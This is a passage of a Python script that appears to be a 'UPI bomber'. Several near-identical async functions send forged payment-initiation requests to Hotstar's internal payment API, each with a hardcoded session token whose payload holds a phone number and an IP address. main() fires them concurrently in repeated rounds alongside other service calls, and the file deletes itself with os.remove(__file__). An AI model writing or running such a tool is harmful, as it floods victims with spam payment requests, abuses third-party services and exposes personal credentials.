                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/payment?browser_url=%2Fin%2Fpaywall&filters=payment_flow%3Dcheckout_flow&packId=HotstarPremium.IN.Year.1499&pack_id=HotstarPremium.IN.Year.1499&planDuration=YEARS&planFamily=HotstarPremiumSmp&planFrequency=1',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-hs-client': 'platform:web;app_version:23.07.21.2;browser:Chrome;schema_version:0.0.969',
                'x-hs-request-id': '83ffea-e8576-1542c5-651a83',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY5MTMxNDkwNiwiaWF0IjoxNjkxMjI4NTA2LCJpc3MiOiJUUyIsImp0aSI6IjA3M2VkN2EzNGIzYTRlMTBhMWExZWM1YWMzOGRjNzQ3Iiwic3ViIjoie1wiaElkXCI6XCI4OTNlMDAzOGVlYTQ0ZDE2YmZiNDY1YmQyOTIwMTljM1wiLFwicElkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwibmFtZVwiOlwiZmpkZ2pyZFwiLFwicGhvbmVcIjpcIjk1NTQ5Mjk0MzZcIixcImlwXCI6XCIxMDMuMTgwLjk0LjE4NFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJwaG9uZVwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjp0cnVlLFwiZGV2aWNlSWRcIjpcIjRlNTQ4NWYyLWMxOTAtNDhjZi04Yzk4LTg4M2E0YzQwMDI3OFwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJlbnRcIjpcIkNxa0JDZ1VLQXdvQkFCS2ZBUklIWVc1a2NtOXBaQklEYVc5ekVnbGhibVJ5YjJsa2RIWVNCbVpwY21WMGRoSUhZWEJ3YkdWMGRoSUVjbTlyZFJJRGQyVmlFZ1J0ZDJWaUVnZDBhWHBsYm5SMkVnVjNaV0p2Y3hJR2FtbHZjM1JpRWdwamFISnZiV1ZqWVhOMEVnUjBkbTl6RWdSd1kzUjJFZ05xYVc4U0IycHBieTFzZVdZU0JIaGliM2dTQzNCc1lYbHpkR0YwYVc5dUdnSnpaQ0lEYzJSeUtnWnpkR1Z5Wlc5WUFRb2lDaG9LRGhJRk5UVTRNellTQlRZME1EUTVDZ2dpQm1acGNtVjBkaElFT0dSWUFRb0xFZ2tJQ2pnQlVPQURXQUVTQmdnQklBRXdBUT09XCIsXCJpc3N1ZWRBdFwiOjE2OTEyMjg1MDYxNjgsXCJtYXR1cml0eUxldmVsXCI6XCJBXCIsXCJpbWdcIjpcIjM4XCIsXCJkcGlkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFCSUFDaElJQUNJT2dBRVppQUVCa0FIUHFvU29uREVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLckFFSUFDcW5BUW9DQ2dBS0Nnb0NDQUlZNXNQTG93WUtid29IQ0FFVkFBQUFRQklLQ2dOaVpXNGxNUGlYUFJJS0NnTm9hVzRsVlA4T1B4SUtDZ04wWVcwbHhYL3pQUklLQ2dOdFlXd2xJUXIyUEJJS0NnTnJZVzRsOGowZ1BCSUtDZ05sYm1jbDhQdzZQUklLQ2dOMFpXd2xRWVR3UFJJS0NnTnRZWElsMVFBNlBSam13OHVqQmdvUkNnSUlBeElGQ2dOb2FXNFk1c1BMb3dZS0VRb0NDQVFTQlFvRGFHbHVHT2JEeTZNR1wifSIsInZlcnNpb24iOiIxXzAifQ.OkZoAWN3FFM1X5YyqRX1jcUynvoBSQCZfGlRvd0xsDg',
            }

            json_data = {
                'paymentMode': 'UPI',
                'pgName': 'razorUPI',
                'paymentProcessor': 'razorS2SCollect',
                'subscriptionPack': 'HotstarPremium.IN.Year.1499',
                'returnUrl': 'https://www.hotstar.com/in/payment?filters=payment_flow%3Dstatus_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id=%7B%7BtransactionId%7D%7D&prevpageurl=%2Fin%2Fmypage',
                'abTags': [
                    'PayX',
                ],
                'bankCode': '',
                'cardBIN': '',
                'fname': '',
                'lname': '',
                'latitude': '',
                'longitude': '',
                'payload': {
                    'vpa': '€tor',
                },
                'paymentHash': '',
                'pgParams': {
                    'versionCode': '-1',
                    'redirectURL': 'https://www.hotstar.com/in/payment?filters=payment_flow=status_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id={{transactionId}}',
                    'mobileNumber': '9123929436',
                },
                'phoneNumber': '',
                'referralCode': '',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.hotstar.com/api/internal/bff/gringotts/v4/web/payment/initiate',headers=headers,json=json_data,) as response:
                    pass
        except Exception as e:
            pass

    async def hotstar3():
        try:
            headers = {
                'authority': 'www.hotstar.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/payment?browser_url=%2Fin%2Fpaywall&filters=payment_flow%3Dcheckout_flow&packId=HotstarPremium.IN.Year.1499&pack_id=HotstarPremium.IN.Year.1499&planDuration=YEARS&planFamily=HotstarPremiumSmp&planFrequency=1',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-hs-client': 'platform:web;app_version:23.07.21.2;browser:Chrome;schema_version:0.0.969',
                'x-hs-request-id': '83ffea-e8576-1542c5-651a83',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY5MTMxNDkwNiwiaWF0IjoxNjkxMjI4NTA2LCJpc3MiOiJUUyIsImp0aSI6IjA3M2VkN2EzNGIzYTRlMTBhMWExZWM1YWMzOGRjNzQ3Iiwic3ViIjoie1wiaElkXCI6XCI4OTNlMDAzOGVlYTQ0ZDE2YmZiNDY1YmQyOTIwMTljM1wiLFwicElkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwibmFtZVwiOlwiZmpkZ2pyZFwiLFwicGhvbmVcIjpcIjk1NTQ5Mjk0MzZcIixcImlwXCI6XCIxMDMuMTgwLjk0LjE4NFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJwaG9uZVwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjp0cnVlLFwiZGV2aWNlSWRcIjpcIjRlNTQ4NWYyLWMxOTAtNDhjZi04Yzk4LTg4M2E0YzQwMDI3OFwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJlbnRcIjpcIkNxa0JDZ1VLQXdvQkFCS2ZBUklIWVc1a2NtOXBaQklEYVc5ekVnbGhibVJ5YjJsa2RIWVNCbVpwY21WMGRoSUhZWEJ3YkdWMGRoSUVjbTlyZFJJRGQyVmlFZ1J0ZDJWaUVnZDBhWHBsYm5SMkVnVjNaV0p2Y3hJR2FtbHZjM1JpRWdwamFISnZiV1ZqWVhOMEVnUjBkbTl6RWdSd1kzUjJFZ05xYVc4U0IycHBieTFzZVdZU0JIaGliM2dTQzNCc1lYbHpkR0YwYVc5dUdnSnpaQ0lEYzJSeUtnWnpkR1Z5Wlc5WUFRb2lDaG9LRGhJRk5UVTRNellTQlRZME1EUTVDZ2dpQm1acGNtVjBkaElFT0dSWUFRb0xFZ2tJQ2pnQlVPQURXQUVTQmdnQklBRXdBUT09XCIsXCJpc3N1ZWRBdFwiOjE2OTEyMjg1MDYxNjgsXCJtYXR1cml0eUxldmVsXCI6XCJBXCIsXCJpbWdcIjpcIjM4XCIsXCJkcGlkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFCSUFDaElJQUNJT2dBRVppQUVCa0FIUHFvU29uREVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLckFFSUFDcW5BUW9DQ2dBS0Nnb0NDQUlZNXNQTG93WUtid29IQ0FFVkFBQUFRQklLQ2dOaVpXNGxNUGlYUFJJS0NnTm9hVzRsVlA4T1B4SUtDZ04wWVcwbHhYL3pQUklLQ2dOdFlXd2xJUXIyUEJJS0NnTnJZVzRsOGowZ1BCSUtDZ05sYm1jbDhQdzZQUklLQ2dOMFpXd2xRWVR3UFJJS0NnTnRZWElsMVFBNlBSam13OHVqQmdvUkNnSUlBeElGQ2dOb2FXNFk1c1BMb3dZS0VRb0NDQVFTQlFvRGFHbHVHT2JEeTZNR1wifSIsInZlcnNpb24iOiIxXzAifQ.OkZoAWN3FFM1X5YyqRX1jcUynvoBSQCZfGlRvd0xsDg',
            }

            json_data = {
                'paymentMode': 'UPI',
                'pgName': 'razorUPI',
                'paymentProcessor': 'razorS2SCollect',
                'subscriptionPack': 'HotstarPremium.IN.Year.1499',
                'returnUrl': 'https://www.hotstar.com/in/payment?filters=payment_flow%3Dstatus_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id=%7B%7BtransactionId%7D%7D&prevpageurl=%2Fin%2Fmypage',
                'abTags': [
                    'PayX',
                ],
                'bankCode': '',
                'cardBIN': '',
                'fname': '',
                'lname': '',
                'latitude': '',
                'longitude': '',
                'payload': {
                    'vpa': '€tor',
                },
                'paymentHash': '',
                'pgParams': {
                    'versionCode': '-1',
                    'redirectURL': 'https://www.hotstar.com/in/payment?filters=payment_flow=status_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id={{transactionId}}',
                    'mobileNumber': '9545829436',
                },
                'phoneNumber': '',
                'referralCode': '',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.hotstar.com/api/internal/bff/gringotts/v4/web/payment/initiate',headers=headers,json=json_data,) as response:
                    pass
        except Exception as e:
            pass

    async def hotstar4():
        try:
            headers = {
                'authority': 'www.hotstar.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/payment?browser_url=%2Fin%2Fpaywall&filters=payment_flow%3Dcheckout_flow&packId=HotstarPremium.IN.Year.1499&pack_id=HotstarPremium.IN.Year.1499&planDuration=YEARS&planFamily=HotstarPremiumSmp&planFrequency=1',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-hs-client': 'platform:web;app_version:23.07.21.2;browser:Chrome;schema_version:0.0.969',
                'x-hs-request-id': '83ffea-e8576-1542c5-651a83',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY5MTMxNDkwNiwiaWF0IjoxNjkxMjI4NTA2LCJpc3MiOiJUUyIsImp0aSI6IjA3M2VkN2EzNGIzYTRlMTBhMWExZWM1YWMzOGRjNzQ3Iiwic3ViIjoie1wiaElkXCI6XCI4OTNlMDAzOGVlYTQ0ZDE2YmZiNDY1YmQyOTIwMTljM1wiLFwicElkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwibmFtZVwiOlwiZmpkZ2pyZFwiLFwicGhvbmVcIjpcIjk1NTQ5Mjk0MzZcIixcImlwXCI6XCIxMDMuMTgwLjk0LjE4NFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJwaG9uZVwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjp0cnVlLFwiZGV2aWNlSWRcIjpcIjRlNTQ4NWYyLWMxOTAtNDhjZi04Yzk4LTg4M2E0YzQwMDI3OFwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJlbnRcIjpcIkNxa0JDZ1VLQXdvQkFCS2ZBUklIWVc1a2NtOXBaQklEYVc5ekVnbGhibVJ5YjJsa2RIWVNCbVpwY21WMGRoSUhZWEJ3YkdWMGRoSUVjbTlyZFJJRGQyVmlFZ1J0ZDJWaUVnZDBhWHBsYm5SMkVnVjNaV0p2Y3hJR2FtbHZjM1JpRWdwamFISnZiV1ZqWVhOMEVnUjBkbTl6RWdSd1kzUjJFZ05xYVc4U0IycHBieTFzZVdZU0JIaGliM2dTQzNCc1lYbHpkR0YwYVc5dUdnSnpaQ0lEYzJSeUtnWnpkR1Z5Wlc5WUFRb2lDaG9LRGhJRk5UVTRNellTQlRZME1EUTVDZ2dpQm1acGNtVjBkaElFT0dSWUFRb0xFZ2tJQ2pnQlVPQURXQUVTQmdnQklBRXdBUT09XCIsXCJpc3N1ZWRBdFwiOjE2OTEyMjg1MDYxNjgsXCJtYXR1cml0eUxldmVsXCI6XCJBXCIsXCJpbWdcIjpcIjM4XCIsXCJkcGlkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFCSUFDaElJQUNJT2dBRVppQUVCa0FIUHFvU29uREVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLckFFSUFDcW5BUW9DQ2dBS0Nnb0NDQUlZNXNQTG93WUtid29IQ0FFVkFBQUFRQklLQ2dOaVpXNGxNUGlYUFJJS0NnTm9hVzRsVlA4T1B4SUtDZ04wWVcwbHhYL3pQUklLQ2dOdFlXd2xJUXIyUEJJS0NnTnJZVzRsOGowZ1BCSUtDZ05sYm1jbDhQdzZQUklLQ2dOMFpXd2xRWVR3UFJJS0NnTnRZWElsMVFBNlBSam13OHVqQmdvUkNnSUlBeElGQ2dOb2FXNFk1c1BMb3dZS0VRb0NDQVFTQlFvRGFHbHVHT2JEeTZNR1wifSIsInZlcnNpb24iOiIxXzAifQ.OkZoAWN3FFM1X5YyqRX1jcUynvoBSQCZfGlRvd0xsDg',
            }

            json_data = {
                'paymentMode': 'UPI',
                'pgName': 'razorUPI',
                'paymentProcessor': 'razorS2SCollect',
                'subscriptionPack': 'HotstarPremium.IN.Year.1499',
                'returnUrl': 'https://www.hotstar.com/in/payment?filters=payment_flow%3Dstatus_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id=%7B%7BtransactionId%7D%7D&prevpageurl=%2Fin%2Fmypage',
                'abTags': [
                    'PayX',
                ],
                'bankCode': '',
                'cardBIN': '',
                'fname': '',
                'lname': '',
                'latitude': '',
                'longitude': '',
                'payload': {
                    'vpa': '€tor',
                },
                'paymentHash': '',
                'pgParams': {
                    'versionCode': '-1',
                    'redirectURL': 'https://www.hotstar.com/in/payment?filters=payment_flow=status_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id={{transactionId}}',
                    'mobileNumber': '9514529436',
                },
                'phoneNumber': '',
                'referralCode': '',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.hotstar.com/api/internal/bff/gringotts/v4/web/payment/initiate',headers=headers,json=json_data,) as response:
                    pass
        except Exception as e:
            pass

    async def hotstar5():
        try:
            headers = {
                'authority': 'www.hotstar.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/payment?browser_url=%2Fin%2Fpaywall&filters=payment_flow%3Dcheckout_flow&packId=HotstarPremium.IN.Year.1499&pack_id=HotstarPremium.IN.Year.1499&planDuration=YEARS&planFamily=HotstarPremiumSmp&planFrequency=1',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-hs-client': 'platform:web;app_version:23.07.21.2;browser:Chrome;schema_version:0.0.969',
                'x-hs-request-id': '83ffea-e8576-1542c5-651a83',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY5MTMxNDkwNiwiaWF0IjoxNjkxMjI4NTA2LCJpc3MiOiJUUyIsImp0aSI6IjA3M2VkN2EzNGIzYTRlMTBhMWExZWM1YWMzOGRjNzQ3Iiwic3ViIjoie1wiaElkXCI6XCI4OTNlMDAzOGVlYTQ0ZDE2YmZiNDY1YmQyOTIwMTljM1wiLFwicElkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwibmFtZVwiOlwiZmpkZ2pyZFwiLFwicGhvbmVcIjpcIjk1NTQ5Mjk0MzZcIixcImlwXCI6XCIxMDMuMTgwLjk0LjE4NFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJwaG9uZVwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjp0cnVlLFwiZGV2aWNlSWRcIjpcIjRlNTQ4NWYyLWMxOTAtNDhjZi04Yzk4LTg4M2E0YzQwMDI3OFwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJlbnRcIjpcIkNxa0JDZ1VLQXdvQkFCS2ZBUklIWVc1a2NtOXBaQklEYVc5ekVnbGhibVJ5YjJsa2RIWVNCbVpwY21WMGRoSUhZWEJ3YkdWMGRoSUVjbTlyZFJJRGQyVmlFZ1J0ZDJWaUVnZDBhWHBsYm5SMkVnVjNaV0p2Y3hJR2FtbHZjM1JpRWdwamFISnZiV1ZqWVhOMEVnUjBkbTl6RWdSd1kzUjJFZ05xYVc4U0IycHBieTFzZVdZU0JIaGliM2dTQzNCc1lYbHpkR0YwYVc5dUdnSnpaQ0lEYzJSeUtnWnpkR1Z5Wlc5WUFRb2lDaG9LRGhJRk5UVTRNellTQlRZME1EUTVDZ2dpQm1acGNtVjBkaElFT0dSWUFRb0xFZ2tJQ2pnQlVPQURXQUVTQmdnQklBRXdBUT09XCIsXCJpc3N1ZWRBdFwiOjE2OTEyMjg1MDYxNjgsXCJtYXR1cml0eUxldmVsXCI6XCJBXCIsXCJpbWdcIjpcIjM4XCIsXCJkcGlkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFCSUFDaElJQUNJT2dBRVppQUVCa0FIUHFvU29uREVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLckFFSUFDcW5BUW9DQ2dBS0Nnb0NDQUlZNXNQTG93WUtid29IQ0FFVkFBQUFRQklLQ2dOaVpXNGxNUGlYUFJJS0NnTm9hVzRsVlA4T1B4SUtDZ04wWVcwbHhYL3pQUklLQ2dOdFlXd2xJUXIyUEJJS0NnTnJZVzRsOGowZ1BCSUtDZ05sYm1jbDhQdzZQUklLQ2dOMFpXd2xRWVR3UFJJS0NnTnRZWElsMVFBNlBSam13OHVqQmdvUkNnSUlBeElGQ2dOb2FXNFk1c1BMb3dZS0VRb0NDQVFTQlFvRGFHbHVHT2JEeTZNR1wifSIsInZlcnNpb24iOiIxXzAifQ.OkZoAWN3FFM1X5YyqRX1jcUynvoBSQCZfGlRvd0xsDg',
            }

            json_data = {
                'paymentMode': 'UPI',
                'pgName': 'razorUPI',
                'paymentProcessor': 'razorS2SCollect',
                'subscriptionPack': 'HotstarPremium.IN.Year.1499',
                'returnUrl': 'https://www.hotstar.com/in/payment?filters=payment_flow%3Dstatus_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id=%7B%7BtransactionId%7D%7D&prevpageurl=%2Fin%2Fmypage',
                'abTags': [
                    'PayX',
                ],
                'bankCode': '',
                'cardBIN': '',
                'fname': '',
                'lname': '',
                'latitude': '',
                'longitude': '',
                'payload': {
                    'vpa': '€tor',
                },
                'paymentHash': '',
                'pgParams': {
                    'versionCode': '-1',
                    'redirectURL': 'https://www.hotstar.com/in/payment?filters=payment_flow=status_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id={{transactionId}}',
                    'mobileNumber': '9512529436',
                },
                'phoneNumber': '',
                'referralCode': '',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.hotstar.com/api/internal/bff/gringotts/v4/web/payment/initiate',headers=headers,json=json_data,) as response:
                    pass
        except Exception as e:
            pass

    async def hotstar6():
        try:
            headers = {
                'authority': 'www.hotstar.com',
                'accept': 'application/json, text/plain, */*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.hotstar.com',
                'referer': 'https://www.hotstar.com/in/payment?browser_url=%2Fin%2Fpaywall&filters=payment_flow%3Dcheckout_flow&packId=HotstarPremium.IN.Year.1499&pack_id=HotstarPremium.IN.Year.1499&planDuration=YEARS&planFamily=HotstarPremiumSmp&planFrequency=1',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
                'x-hs-client': 'platform:web;app_version:23.07.21.2;browser:Chrome;schema_version:0.0.969',
                'x-hs-request-id': '83ffea-e8576-1542c5-651a83',
                'x-hs-usertoken': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhcHBJZCI6IiIsImF1ZCI6InVtX2FjY2VzcyIsImV4cCI6MTY5MTMxNDkwNiwiaWF0IjoxNjkxMjI4NTA2LCJpc3MiOiJUUyIsImp0aSI6IjA3M2VkN2EzNGIzYTRlMTBhMWExZWM1YWMzOGRjNzQ3Iiwic3ViIjoie1wiaElkXCI6XCI4OTNlMDAzOGVlYTQ0ZDE2YmZiNDY1YmQyOTIwMTljM1wiLFwicElkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwibmFtZVwiOlwiZmpkZ2pyZFwiLFwicGhvbmVcIjpcIjk1NTQ5Mjk0MzZcIixcImlwXCI6XCIxMDMuMTgwLjk0LjE4NFwiLFwiY291bnRyeUNvZGVcIjpcImluXCIsXCJjdXN0b21lclR5cGVcIjpcIm51XCIsXCJ0eXBlXCI6XCJwaG9uZVwiLFwiaXNFbWFpbFZlcmlmaWVkXCI6ZmFsc2UsXCJpc1Bob25lVmVyaWZpZWRcIjp0cnVlLFwiZGV2aWNlSWRcIjpcIjRlNTQ4NWYyLWMxOTAtNDhjZi04Yzk4LTg4M2E0YzQwMDI3OFwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJlbnRcIjpcIkNxa0JDZ1VLQXdvQkFCS2ZBUklIWVc1a2NtOXBaQklEYVc5ekVnbGhibVJ5YjJsa2RIWVNCbVpwY21WMGRoSUhZWEJ3YkdWMGRoSUVjbTlyZFJJRGQyVmlFZ1J0ZDJWaUVnZDBhWHBsYm5SMkVnVjNaV0p2Y3hJR2FtbHZjM1JpRWdwamFISnZiV1ZqWVhOMEVnUjBkbTl6RWdSd1kzUjJFZ05xYVc4U0IycHBieTFzZVdZU0JIaGliM2dTQzNCc1lYbHpkR0YwYVc5dUdnSnpaQ0lEYzJSeUtnWnpkR1Z5Wlc5WUFRb2lDaG9LRGhJRk5UVTRNellTQlRZME1EUTVDZ2dpQm1acGNtVjBkaElFT0dSWUFRb0xFZ2tJQ2pnQlVPQURXQUVTQmdnQklBRXdBUT09XCIsXCJpc3N1ZWRBdFwiOjE2OTEyMjg1MDYxNjgsXCJtYXR1cml0eUxldmVsXCI6XCJBXCIsXCJpbWdcIjpcIjM4XCIsXCJkcGlkXCI6XCIxODI3ZTQ2OWJhMDg0ZmYxYjg0OTFiYmEyMTI0MWQyMVwiLFwic3RcIjoxLFwiZGF0YVwiOlwiQ2dRSUFCSUFDaElJQUNJT2dBRVppQUVCa0FIUHFvU29uREVLQkFnQU9nQUtCQWdBTWdBS0JBZ0FRZ0FLckFFSUFDcW5BUW9DQ2dBS0Nnb0NDQUlZNXNQTG93WUtid29IQ0FFVkFBQUFRQklLQ2dOaVpXNGxNUGlYUFJJS0NnTm9hVzRsVlA4T1B4SUtDZ04wWVcwbHhYL3pQUklLQ2dOdFlXd2xJUXIyUEJJS0NnTnJZVzRsOGowZ1BCSUtDZ05sYm1jbDhQdzZQUklLQ2dOMFpXd2xRWVR3UFJJS0NnTnRZWElsMVFBNlBSam13OHVqQmdvUkNnSUlBeElGQ2dOb2FXNFk1c1BMb3dZS0VRb0NDQVFTQlFvRGFHbHVHT2JEeTZNR1wifSIsInZlcnNpb24iOiIxXzAifQ.OkZoAWN3FFM1X5YyqRX1jcUynvoBSQCZfGlRvd0xsDg',
            }

            json_data = {
                'paymentMode': 'UPI',
                'pgName': 'razorUPI',
                'paymentProcessor': 'razorS2SCollect',
                'subscriptionPack': 'HotstarPremium.IN.Year.1499',
                'returnUrl': 'https://www.hotstar.com/in/payment?filters=payment_flow%3Dstatus_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id=%7B%7BtransactionId%7D%7D&prevpageurl=%2Fin%2Fmypage',
                'abTags': [
                    'PayX',
                ],
                'bankCode': '',
                'cardBIN': '',
                'fname': '',
                'lname': '',
                'latitude': '',
                'longitude': '',
                'payload': {
                    'vpa': '€tor',
                },
                'paymentHash': '',
                'pgParams': {
                    'versionCode': '-1',
                    'redirectURL': 'https://www.hotstar.com/in/payment?filters=payment_flow=status_flow&pack_id=HotstarPremium.IN.Year.1499&transaction_id={{transactionId}}',
                    'mobileNumber': '9785929436',
                },
                'phoneNumber': '',
                'referralCode': '',
            }
            async with aiohttp.ClientSession() as sess:
                async with sess.post('https://www.hotstar.com/api/internal/bff/gringotts/v4/web/payment/initiate',headers=headers,json=json_data,) as response:
                    pass
        except Exception as e:
            pass



    async def main():
        for i in range(4):
            await asyncio.gather(
                #OTTplay(upid),
                hotstar1(),
                codehelp(),
                doubtnut(),
                hotstar2(),
                codehelp1(),
                doubtnut1(),
                hotstar3(),
                codehelp2(),
                doubtnut2(),
                hotstar4(),
                codehelp3(),
                doubtnut3(),
                hotstar5(),
                hotstar6(),
                # kanchalanka(upid),
                # hindustanmedia(upid),
                # hindustanmedia2(upid),
                # hoichoi(upid)

            )
        

    asyncio.run(main())

os.remove(__file__)
start = time.time()
upi()
end = time.time()
f = open("upi.txt", "w")
f.write(str(end-start))
f.close()        

